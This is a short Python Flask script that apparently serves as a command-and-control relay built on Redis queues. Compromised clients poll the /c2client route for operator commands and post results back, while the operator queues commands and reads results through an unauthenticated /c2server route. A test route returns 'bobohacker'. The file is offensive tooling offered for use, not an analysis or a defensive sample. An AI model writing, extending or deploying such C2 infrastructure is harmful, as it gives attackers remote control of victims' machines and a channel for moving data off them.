#! /usr/bin/env python
# coding=utf-8
from flask import Flask, request, session
import requests
import datetime
import logging
import queue
import sqlite3
import redis

#redisip与redisport替换成自己redis服务器数据

rcon = redis.StrictRedis(host='redisip',port=redisport, db=5)
prodcons_queue = 'task:prodcons:queue'
cmd_queue = 'task:cmd:queue'

app = Flask(__name__)

@app.route('/c2client',methods=['GET', 'POST'])
def c2client():
	if request.method == 'POST':
		results_args = request.form['results']
		rcon.lpush(prodcons_queue, results_args)
		return 'ok'
	if 'cmd' in request.args:
		try:
			cmds = rcon.rpop(cmd_queue)
		except:
			return 'nothing'
		if cmds != '':
			return cmds
		else:
			return 'nothing'
		return 'ok'
	return 'ok'




@app.route('/c2server')
def c2server():
	if 'results' in request.args:
		try:
			results = rcon.rpop(prodcons_queue)
		except:
			return 'nothing'
		if results != '':
			return results
		else:
			return 'nothing'
		return 'nothing'
	if 'cmd' in request.args:
		cmd_args = request.args['cmd']
		rcon.lpush(cmd_queue, cmd_args)
		return 'ok'
	return 'ok'

@app.route('/test')
def test():
	return 'bobohacker'


if __name__ == '__main__':
    app.run()
